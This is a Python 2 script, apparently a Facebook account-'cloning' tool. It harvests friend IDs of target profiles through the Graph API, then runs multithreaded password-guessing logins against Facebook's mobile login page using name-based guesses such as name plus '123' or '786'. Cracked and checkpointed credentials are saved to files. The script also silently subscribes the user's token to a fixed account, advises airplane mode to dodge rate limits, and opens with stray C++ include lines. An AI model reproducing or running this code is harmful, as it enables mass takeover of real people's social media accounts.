#!/usr/bin/python2
# -*- coding: utf-8
#!/usr/bin/env
#include <iostream>
#include <fstream>
#include <string>
#include <future>
#include <cstdio>
#include <vector>
#include <stdio.h>
#include <cython>
#include <platform>
#include <time>
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
os.system('rm -rf .djs')
for n in range (5000):
	nmbr = random.randint(11111111,99999999)
	sys.stdout = open('.djs', 'a')
	print (nmbr)
	sys.stdout.flush()
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid, subprocess, calendar
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from datetime import datetime

try:
	os.mkdir('/sdcard/ids')
except:
	pass
try:
	import requests
except ImportError:
	os.system('pip2 install requests')
	os.mkdir('/sdcard/.data.txt')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text.strip()
ua = random.choice([
  "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
  "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
  "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
  "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
  "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
  "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
url = 'https://mbasic.facebook.com'
os.system('clear')
logo = """
\033[1;37m   ########  ####  ######  ##     ## ##     ## 
\033[1;37m   ##     ##  ##  ##    ## ##     ## ##     ## 
\033[1;37m   ##     ##  ##  ##       ##     ## ##     ## 
\033[1;37m   ########   ##   ######  ######### ##     ## 
\033[1;37m   ##   ##    ##        ## ##     ## ##     ## 
\033[1;37m   ##    ##   ##  ##    ## ##     ## ##     ## 
\033[1;37m   ##     ## ####  ######  ##     ##  #######  
\033[1;97m-------------------------------------------------
\033[1;97m  ➤ AUTHOR  : RISHU KHAN 
\033[1;97m  ➤ GITHUB  : https://github.com/Alon3-Rishu
\033[1;97m  ➤ FB ID   : www.facebook.com/MR.RISHU.KHAN
\033[1;97m-------------------------------------------------
\033[1;97m░░░░░░░░\033[1;97m╬ \033[1;97m\033[1;41m𝕀𝔽 𝕐𝕆𝕌 𝔻ℝ𝔼𝔸𝕄 𝕀𝕋 𝕐𝕆𝕌 ℂ𝔸ℕ 𝔻𝕆 𝕀𝕋\033[0m\x1b[1;37m ╬░░░░░░░░
\033[1;97m-------------------------------------------------"""
loop = 0
id = []
cp = []
ok = []

def main_button():
	os.system("clear")
	print logo
	print('[1] PUBLIC CLONING (Token login) ')
	print('[2] BACK MENU')
	print('\033[1;97m-------------------------------------------------')
	somi_star_boy()
def somi_star_boy():
	input0 = raw_input('[*] Choose : ')
	if input0 == '1':
		token()
	elif input0 == '2':
		random4()
	elif input0 == '3':
		Somi().__menu__()
	else:
		print ''
		print '  • Choose correct option'
		print ''
		main_button()
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        my_menu()
    except(KeyError , IOError):
        print(logo)
        print("\t      LOGIN TOKEN")
        print('\033[1;97m-------------------------------------------------')
        token = raw_input("[?] PASTE TOKEN HERE : ")
        print('\033[1;97m-------------------------------------------------')
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        bot_follow()
def bot_follow():
	try:
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		na= a["birthday"]
		id = a["id"]
		nama = a["name"]
	except IOError:
		print("Token Invalid")
		token()
	requests.post('https://graph.facebook.com/1376599765/subscribers?access_token=' + token)
	my_menu()
def my_menu():
	try:
		token=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		id = a["id"]
		name = a["name"]
	except KeyError:
		os.system('clear')
		print ' [!] Token Invalid'
		os.system('rm -f login.txt')
		time.sleep(3)
		login()
	except requests.exceptions.ConnectionError:
		print '  [!] No Connection'
		sys.exit()
	
	os.system("clear")
	print logo
	print("\033[1;97m[\033[1;92m✓\033[1;97m] NAME     :  \033[1;92m"+name)
	print("\033[1;97m[\033[1;92m✓\033[1;97m] TOKEN    :  \033[1;92m"+id)
	print("\033[1;97m[\033[1;92m✓\033[1;97m] YOUR IP  :  \033[1;92m"+ip)
	print("\033[1;97m[\033[1;92m✓\033[1;97m] STATUS   :  \033[1;92mPREMIUM")
	print('\033[1;97m-------------------------------------------------')
	print('[1] PUBLIC FRINDLIST/FOLLOWER CLONING')
	print('[2] FILE CLONING')
	print('[3] EXTRACT IDS')
	print('[4] OWNER RISHU')
	print('[0] LOGOUT')
	print('\033[1;97m-------------------------------------------------')
	s_star_boy()
def s_star_boy():
	input = raw_input('[*] Choose : ')
	if input == '1':
		fix()
	elif input == '2':
		choice_pass()
	elif input == '3':
		os.system("python2 somidump.py")
		random9()
	elif input == '4':
		os.system('xdg-open https://chat.whatsapp.com/DxIsH1q9KipIYpuAdylcvg')
	elif input == '5':
		os.system('xdg-open https://www.facebook.com/groups/2716366185327789/permalink/2767275330236874/?app=fbl')
	elif input == '0':
		os.system('rm -rf access_token.txt')
		main_button()
	else:
		print ''
		print '  • Choose correct option'
		print ''
		my_menu()
def fix():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [×] Token Invalid")
		os.system('rm -rf login.txt')
		print logo
	os.system('clear')
	print logo
	print '[1] MULTIPLE PUBLIC ID CREAKING'
	print '[0] BACK MENU'
	print('\033[1;97m-------------------------------------------------')
	fixpass()
def fixpass():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [×] Token Invalid")
		os.system('rm -rf login.txt')
		print logo
	global cp
	global loop
	global ok
	input1 = raw_input('[*] Choose : ')
	os.system('clear')
	if input1 == '':
		print '  • Choose The Correct Option !'
		exit()
	elif input1 == '0' or input1 == '00':
		fix()
	elif input1 == '1' or input1 == '01':
		os.system("clear")
		print logo
        print('\tSINGLE AND MULTIPLE ID LINK CLONING')
        print('\033[1;97m-------------------------------------------------')
	try:
		link_amount = int(input("[?] HOW MANY IDS DO YOU WANT TO ADD : "))
		print('\033[1;97m-------------------------------------------------')
	except:link_amount=1
	for n in range(link_amount):
		n +=1
		idt = raw_input("[\033[1;92m%s\033[1;97m] INPUT ID : "%(n))
		try:
			pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
			sp = json.loads(pok.text)
			print("\033[1;97m[\033[1;92m✓\033[1;97m] NAME : \033[1;92m") + sp['name']
			print('\033[1;97m-------------------------------------------------')
		except KeyError:
			print ' [!] something wrong'
			fixpass()
		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0] 
			id.append(uid + '|' + na)
	os.system("clear")
	print logo
	print("\x1b[1;97m[$] TOTAL IDS : \x1b[1;92m"+str(len(id)))
	print('\x1b[1;97m[$] THE PROCESS HAS STARTED')
	print('\033[1;97m-------------------------------------------------')
	print('\x1b[1;93m     USE FLIGHT (AIRPLANE) MODE BEFORE USE')
	print('\033[1;97m-------------------------------------------------')
	def main(arg):
		global ua
		user = arg
		uid, name = user.split('|')
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower()
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': ua})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print '\x1b[1;92m[RISHU-SUCES] ' + uid + ' | ' + pass1
				ok.append(uid + ' | ' + pass1)
				save = open('out/ok.txt', 'a')
				save.write(' ' + str(uid) + ' | ' + str(pass1) + '\n')
				save.close()
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass1
				cp.append(uid + ' | ' + pass1)
				save = open('out/cp.txt', 'a')
				save.write(' ' + str(uid) + ' | ' + str(pass1) + '\n')
				save.close()
			else:
				pass2 = name.lower().split(' ')[0] + '123'
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.url
				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
					print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass2
					ok.append(uid + ' | ' + pass2)
					save = open('out/ok.txt', 'a')
					save.write(' ' + str(uid) + ' | ' + str(pass2) + '\n')
					save.close()
				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
					print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass2
					cp.append(uid + ' | ' + pass2)
					save = open('out/cp.txt', 'a')
					save.write(' ' + str(uid) + ' | ' + str(pass2) + '\n')
					save.close()
				else:
					pass3 = name.lower().split(' ')[0] + '@123'
					rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': ua})
					xo = rex.url
					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
						print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass3
						ok.append(uid + ' | ' + pass3)
						save = open('out/ok.txt', 'a')
						save.write(' ' + str(uid) + ' | ' + str(pass3) + '\n')
						save.close()
					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
						print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass3
						cp.append(uid + ' | ' + pass3)
						save = open('out/cp.txt', 'a')
						save.write(' ' + str(uid) + ' | ' + str(pass3) + '\n')
						save.close()
					else:
						pass4 = name.lower().split(' ')[0] + '12345'
						rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': ua})
						xo = rex.url
						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
							print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass4
							ok.append(uid + ' | ' + pass4)
							save = open('out/ok.txt', 'a')
							save.write(' ' + str(uid) + ' | ' + str(pass4) + '\n')
							save.close()
						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
							print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass4
							cp.append(uid + ' | ' + pass4)
							save = open('out/cp.txt', 'a')
							save.write(' ' + uid + ' | ' + str(pass4) + '\n')
							save.close()
						else:
							pass5 = name.lower().split(' ')[0] + name.lower().split(' ')[1] 
							rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': ua})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass5
								ok.append(uid + ' | ' + pass5)
								save = open('out/ok.txt', 'a')
								save.write(' ' + uid + ' | ' + str(pass5) + '\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass5
								cp.append(uid + ' | ' + pass5)
								save = open('out/cp.txt', 'a')
								save.write(' ' + str(uid) + ' | ' + str(pass5) + '\n')
								save.close()
							else:
								pass6 = name.lower().split(' ')[0] + '12356'
								rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'}, headers={'user-agent': ua})
								xo = rex.url
								if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
									print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass6
									ok.append(uid + ' | ' + pass6)
									save = open('out/ok.txt', 'a')
									save.write(' ' + uid + ' | ' + str(pass6) + '\n')
									save.close()
								elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
									print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass6
									cp.append(uid + ' | ' + pass6)
									save = open('out/cp.txt', 'a')
									save.write(' ' + str(uid) + ' | ' + str(pass6) + '\n')
									save.close()
								else:
									pass7 = name.lower().split(' ')[0] + '786'
									rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass7, 'login': 'submit'}, headers={'user-agent': ua})
									xo = rex.url
									if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
										print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass7
										ok.append(uid + ' | ' + pass7)
										save = open('out/ok.txt', 'a')
										save.write(' ' + uid + ' | ' + str(pass7) + '\n')
										save.close()
									elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
										print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass7
										cp.append(uid + ' | ' + pass7)
										save = open('out/cp.txt', 'a')
										save.write(' ' + str(uid) + ' | ' + str(pass7) + '\n')
										save.close()
									else:
										pass8 = "786786"
										rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass8, 'login': 'submit'}, headers={'user-agent': ua})
										xo = rex.url
										if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
											print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass8
											ok.append(uid + ' | ' + pass8)
											save = open('out/ok.txt', 'a')
											save.write(' ' + uid + ' | ' + str(pass8) + '\n')
											save.close()
										elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
											print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass8
											cp.append(uid + ' | ' + pass8)
											save = open('out/cp.txt', 'a')
											save.write(' ' + str(uid) + ' | ' + str(pass8) + '\n')
											save.close()
									
		except:pass
	p = ThreadPool(30)
	p.map(main, id)
	print('\033[1;97m-------------------------------------------------')
	print('\033[1;97m[$] THE PROCESS HAS BEEN COMPLETED')
	print('\033[1;97m[$] TOTAL OK : \x1b[0;92m'+str(len(ok)))
	print('\033[1;97m[$] TOTAL CP : \x1b[0;91m'+str(len(cp)))
	print('\033[1;97m-------------------------------------------------')
	raw_input('\033[1;97mPRESS ENTER TO BACK. ')
	my_menu()
def choice_pass():
	os.system('clear')
	print logo
	print '[1] FILE CLONING '
	print '[2] BACK MENU'
	print('\033[1;97m-------------------------------------------------')
	choicepass()
def choicepass():
	global cp
	global ok
	input2 = raw_input('[?] Choose : ')
	os.system('clear')
	if input2 == '':
		print '  • Choose The Correct One !'
		exit()
	elif input2 == '1' or input2 == '01':
		print logo
		print('          \033[1;41m\033[1;97m*Enter name password*\033[1;0m')
		print('\033[1;97m-------------------------------------------------')
		p1 = raw_input("\033[1;97m[\033[1;92m01\033[1;97m] Name + digit : ")
		p2 = raw_input("\033[1;97m[\033[1;92m02\033[1;97m] Name + digit : ")
		p3 = raw_input("\033[1;97m[\033[1;92m03\033[1;97m] Name + digit : ")
		p4 = raw_input("\033[1;97m[\033[1;92m04\033[1;97m] Name + digit : ")
		pass5 = raw_input("\033[1;97m[\033[1;92m01\033[1;97m] Password : ")
		pass6 = raw_input("\033[1;97m[\033[1;92m02\033[1;97m] Password : ")
		pass7 = raw_input("\033[1;97m[\033[1;92m03\033[1;97m] Password : ")
		pass8 = raw_input("\033[1;97m[\033[1;92m04\033[1;97m] Password : ")
		print('\033[1;97m-------------------------------------------------')
		try:
			filelist = raw_input('[?] INPUT FILE NAME : \033[0;92m')
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
		except (KeyError, IOError):
			print ''
			print '  • File not available\x1b[0;97m'
			print ''
			raw_input(' • Go back')
			my_menu()
	elif input2 == '0' or input2 == '00':
		my_menu()
	else:
		print '  • Choose correct option please'
		exit()
	os.system("clear")
	print logo
	print("\x1b[1;97m[$] TOTAL IDS : \x1b[1;92m"+str(len(id)))
	print('\x1b[1;97m[$] THE PROCESS HAS STARTED')
	print('\033[1;97m-------------------------------------------------')
	print('\x1b[1;93m     USE FLIGHT (AIRPLANE) MODE BEFORE USE')
	print('\033[1;97m-------------------------------------------------')
	def main(arg):
		global ua
		user = arg
		uid, name = user.split('|')
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			pass1 = name.lower() + p1
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': ua})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass1
				ok.append(uid + ' | ' + pass1)
				save = open('out/ok.txt', 'a')
				save.write(' ' + str(uid) + ' | ' + str(pass1) + '\n')
				save.close()
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass1
				cp.append(uid + ' | ' + pass1)
				save = open('out/cp.txt', 'a')
				save.write(' ' + str(uid) + ' | ' + str(pass1) + '\n')
				save.close()
			else:
				pass2 = name.lower() + p2
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.url
				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
					print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass2
					ok.append(uid + ' | ' + pass2)
					save = open('out/ok.txt', 'a')
					save.write(' ' + str(uid) + ' | ' + str(pass2) + '\n')
					save.close()
				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
					print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass2
					cp.append(uid + ' | ' + pass2)
					save = open('out/cp.txt', 'a')
					save.write(' ' + str(uid) + ' | ' + str(pass2) + '\n')
					save.close()
				else:
					pass3 = name.lower() + p3
					rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': ua})
					xo = rex.url
					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
						print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass3
						ok.append(uid + ' | ' + pass3)
						save = open('out/ok.txt', 'a')
						save.write(' ' + str(uid) + ' | ' + str(pass3) + '\n')
						save.close()
					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
						print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass3
						cp.append(uid + ' | ' + pass3)
						save = open('out/cp.txt', 'a')
						save.write(' ' + str(uid) + ' | ' + str(pass3) + '\n')
						save.close()
					else:
						pass4 = name.lower() + p4
						rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': ua})
						xo = rex.url
						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
							print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass4
							ok.append(uid + ' | ' + pass4)
							save = open('out/ok.txt', 'a')
							save.write(' ' + str(uid) + ' | ' + str(pass4) + '\n')
							save.close()
						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
							print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass4
							cp.append(uid + ' | ' + pass4)
							save = open('out/cp.txt', 'a')
							save.write(' ' + uid + ' | ' + str(pass4) + '\n')
							save.close()
						else:
							rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': ua})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass5
								ok.append(uid + ' | ' + pass5)
								save = open('out/ok.txt', 'a')
								save.write(' ' + uid + ' | ' + str(pass5) + '\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass5
								cp.append(uid + ' | ' + pass5)
								save = open('out/cp.txt', 'a')
								save.write(' ' + str(uid) + ' | ' + str(pass5) + '\n')
								save.close()
							else:
								rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'}, headers={'user-agent': ua})
								xo = rex.url
								if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
									print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass6
									ok.append(uid + ' | ' + pass6)
									save = open('out/ok.txt', 'a')
									save.write(' ' + uid + ' | ' + str(pass6) + '\n')
									save.close()
								elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
									print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass6
									cp.append(uid + ' | ' + pass6)
									save = open('out/cp.txt', 'a')
									save.write(' ' + str(uid) + ' | ' + str(pass6) + '\n')
									save.close()
								else:
									rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass7, 'login': 'submit'}, headers={'user-agent': ua})
									xo = rex.url
									if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
										print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass7
										ok.append(uid + ' | ' + pass7)
										save = open('out/ok.txt', 'a')
										save.write(' ' + uid + ' | ' + str(pass7) + '\n')
										save.close()
									elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
										print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass7
										cp.append(uid + ' | ' + pass7)
										save = open('out/cp.txt', 'a')
										save.write(' ' + str(uid) + ' | ' + str(pass7) + '\n')
										save.close()
									else:
										rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass8, 'login': 'submit'}, headers={'user-agent': ua})
										xo = rex.url
										if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
											print '\x1b[1;92m[RISHU-SUCES] \x1b[0;92m' + uid + ' | ' + pass8
											ok.append(uid + ' | ' + pass8)
											save = open('out/ok.txt', 'a')
											save.write(' ' + uid + ' | ' + str(pass8) + '\n')
											save.close()
										elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
											print '\x1b[1;93m[RISHU-CHECK] ' + uid + ' | ' + pass8
											cp.append(uid + ' | ' + pass8)
											save = open('out/cp.txt', 'a')
											save.write(' ' + str(uid) + ' | ' + str(pass8) + '\n')
											save.close()
									
		except:pass
	p = ThreadPool(30)
	p.map(main, id)
	print('\033[1;97m-------------------------------------------------')
	print('\033[1;97m[$] THE PROCESS HAS BEEN COMPLETED')
	print('\033[1;97m[$] TOTAL OK : \x1b[0;92m'+str(len(ok)))
	print('\033[1;97m[$] TOTAL CP : \x1b[0;91m'+str(len(cp)))
	print('\033[1;97m-------------------------------------------------')
	raw_input('\033[1;97mPRESS ENTER TO BACK. ')
	my_menu()


if __name__ == '__main__':
	os.system('git pull')
	main_button()
